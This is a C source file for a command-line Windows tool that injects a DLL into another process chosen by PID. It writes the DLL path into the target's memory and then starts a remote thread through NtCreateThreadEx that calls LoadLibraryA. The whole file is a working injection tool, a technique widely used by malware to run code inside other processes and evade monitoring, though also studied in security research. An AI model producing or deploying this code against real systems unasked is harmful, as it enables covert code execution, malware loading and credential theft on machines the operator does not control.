#include "ntapi_injector.h"

HMODULE getMod(LPCWSTR modName) {

    HMODULE hModule = NULL;
    info("trying to get a handle to %S", modName);

    hModule = GetModuleHandleW(modName);

    if (hModule == NULL) {
        warn("failed to get a handle to the module. error: 0x%lx\n", GetLastError());
        return NULL;
    }

    else {
        okay("got a handle to the module!");
        info("\\___[ %S\n\t\\_0x%p]\n", modName, hModule);
        return hModule;
    }

}

VOID cleanup(HANDLE hThread, HANDLE hProcess) {
    if (hThread) {
        info("closing handle to thread");
        CloseHandle(hThread);
    }
    if (hProcess) {
        info("closing handle to process");
        CloseHandle(hProcess);
    }
}

BOOL NtapiInjector(DWORD PID, const char* DLLPATH) {

    /* init */
    OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

    HANDLE            hProcess = NULL;
    HANDLE            hThread = NULL;
    HMODULE           hKernel32 = NULL;
    HMODULE           hNTDLL = NULL;
    PVOID             rBuffer = NULL;

    size_t            dllpathSize = (strlen(DLLPATH) + 1);
#ifdef _WIN32
    SIZE_T            bytesWritten = 0;
#else
    size_t            bytesWritten = 0;
#endif

    /* open target process and get the handle*/
    info("trying to get a handle to the process (%ld)", PID);
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (hProcess == NULL) {
        warn("Failed to get a handle to the process. error: 0x%lx", GetLastError());
        return FALSE;
    }

    okay("got a handle to the process!");
    info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
    
    /* allocate a memory space in the target process */
    rBuffer = VirtualAllocEx(hProcess, rBuffer, dllpathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    if (rBuffer == NULL) {
        warn("failed to allocate memory in the target process. error: 0x%lx", GetLastError());
        cleanup(hThread, hProcess);
        return FALSE;
    }

    okay("allocated memory in target process");

    /* write the dllpath to the allocated memory space in the target process*/
    if (!WriteProcessMemory(hProcess, rBuffer, DLLPATH, dllpathSize, &bytesWritten)) {
        warn("Failed to write process memory. error: 0x%lx", GetLastError());
        cleanup(hThread, hProcess);
        return FALSE;
    }
    okay("wrote %zu-bytes to the allocated buffer", bytesWritten);

    /* get handler to Kernel32 and NTDLL */
    info("getting handle to Kernel32 and NTDLL");

    hNTDLL = getMod(L"ntdll.dll");
    hKernel32 = getMod(L"kernel32.dll");

    if (hNTDLL == NULL || hKernel32 == NULL) {
        warn("module(s) == NULL. error: 0x%lx", GetLastError());
        cleanup(hThread, hProcess);
        return FALSE;
    }

    // get the address of NtCreateThreadEx in NTDLL
    pNtCreateThreadEx kawCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    okay("got the address of NtCreateThreadEx from NTDLL");
    info("\\___[ kawCreateThread\n\t\\_0x%p]\n", kawCreateThreadEx);

    // get the address of LoadLibraryA in Kernel32
    PTHREAD_START_ROUTINE kawLoadLibraryA = (PTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
    okay("got the address of LoadLibrary from KERNEL32");
    info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", kawLoadLibraryA);
        
   
    /* create a thread in target process and the entry point is call LoadLibrary where the parameter is the dllpath */
    NTSTATUS status = kawCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, kawLoadLibraryA, rBuffer, FALSE, NULL, NULL, NULL, NULL);
    if (status != STATUS_SUCCESS) {
        warn("failed to create thread, error: 0x%lx", status);
        cleanup(hThread, hProcess);
        return FALSE;
    }

    okay("created thread, waiting for it to finish");

    /* wait for the thread */
    WaitForSingleObject(hThread, INFINITE);
    okay("thread finished execution.");
    info("cleaning up now");
    cleanup(hThread, hProcess);
    okay("finished with the cleanup, exiting now.");
    return TRUE;
}

int main(int argc, char* argv[]) {

    if (argc != 3) {
        warn("Usage: %s <PID> <DLLPATH>", argv[0]);
        return EXIT_FAILURE;
    }

    DWORD PID = atoi(argv[1]);
    const char* DLLPATH = argv[2];
    if (NtapiInjector(PID, DLLPATH))
        okay("Inject finish!");
    else
        warn("Filaed to inject!");

    return EXIT_SUCCESS;

}